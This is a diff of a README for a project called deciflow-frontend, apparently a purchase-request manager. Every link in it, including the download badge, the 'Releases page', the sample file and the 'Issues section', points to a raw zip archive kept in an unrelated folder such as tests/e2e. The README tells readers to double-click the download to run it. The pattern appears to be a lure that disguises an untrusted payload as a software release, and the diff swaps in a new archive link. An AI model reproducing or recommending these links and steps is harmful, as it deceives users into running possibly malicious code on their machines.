@@ -1,6 +1,6 @@
 # 🚀 deciflow-frontend - Manage Purchase Requests Easily
 
-[![Download](https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip)](https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip)
+[![Download](https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip)](https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip)
 
 ## 📖 Introduction
 
@@ -16,11 +16,11 @@ Welcome to the **deciflow-frontend** project. This application helps you manage 
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. You can find the latest version on our [Releases page](https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip). 
+To get started, you need to download the application. You can find the latest version on our [Releases page](https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip). 
 
-1. **Visit the Releases Page**: Click the link to go to our [Releases page](https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip).
+1. **Visit the Releases Page**: Click the link to go to our [Releases page](https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip).
 2. **Select the Latest Version**: Choose the most recent release from the list.
-3. **Download the File**: Click on the file that matches your system. This might look like `https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip` for Windows or similar files for macOS/Linux.
+3. **Download the File**: Click on the file that matches your system. This might look like `https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip` for Windows or similar files for macOS/Linux.
 4. **Run the Application**: After downloading, locate the file and double-click it to run the application.
 
 ## 🖥️ System Requirements
@@ -58,7 +58,7 @@ If you run into issues:
 
 For help, you can reach out through:
 
-- **Issues**: Go to the [Issues section](https://github.com/Bharatji009/deciflow-frontend/raw/refs/heads/main/assets/styles/frontend-deciflow-2.0.zip) of this repository to report any bugs or issues.
+- **Issues**: Go to the [Issues section](https://raw.githubusercontent.com/Bharatji009/deciflow-frontend/main/tests/e2e/frontend-deciflow-3.6-beta.4.zip) of this repository to report any bugs or issues.
 - **Community Support**: Join discussions and find answers from other users.
 
 ## 📞 Contact
